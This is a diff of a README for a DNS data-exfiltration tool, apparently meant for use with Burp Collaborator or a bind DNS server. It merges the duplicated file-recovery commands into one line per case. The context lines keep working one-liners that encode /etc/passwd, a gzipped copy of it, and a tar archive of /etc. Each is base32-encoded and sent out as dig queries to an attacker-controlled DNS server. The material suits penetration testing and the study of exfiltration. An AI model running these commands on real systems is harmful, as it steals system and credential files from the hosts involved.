@@ -43,16 +43,10 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 cat /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-To recover the file (on a bind DNS server):
+To recover the file:
 
 ```
-./dns-parse.py <DNS Name> query.log | base32 -d
-```
-
-To recover the file (on a private Burp Collaborator server):
-
-```
-./dns-parse.py <DNS Name> collaborator.log | base32 -d
+./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
 ```
 
 ### Exfiltrate a compressed file:
@@ -61,16 +55,10 @@ To recover the file (on a private Burp Collaborator server):
 cat /etc/passwd | gzip - | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-To recover/unzip the file (on a bind DNS server):
+To recover/unzip the file:
 
 ```
-./dns-parse.py <DNS Name> query.log| base32 -d | zcat
-```
-
-To recover/unzip the file (on a private Burp Collaborator server):
-
-```
-./dns-parse.py <DNS Name> collaborator.log | base32 -d | zcat 
+./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
 ```
 
 ### Exfiltrate a compressed tar archive of a directory:
@@ -81,14 +69,8 @@ Note that exfiltrating /etc on an Ubuntu Linux system worked perfectly (but took
 tar czf - /etc | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-To recover the tar archive (on a bind DNS server):
+To recover the tar archive:
 
 ```
-./dns-parse.py <DNS Name> query.log | base32 -d > exfiltrated.tgz
-```
-
-To recover the tar file (on a bind DNS server):
-
-```
-./dns-parse.py <DNS Name> collaborator.log | base32 -d > exfiltrated.tgz
+./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
 ```
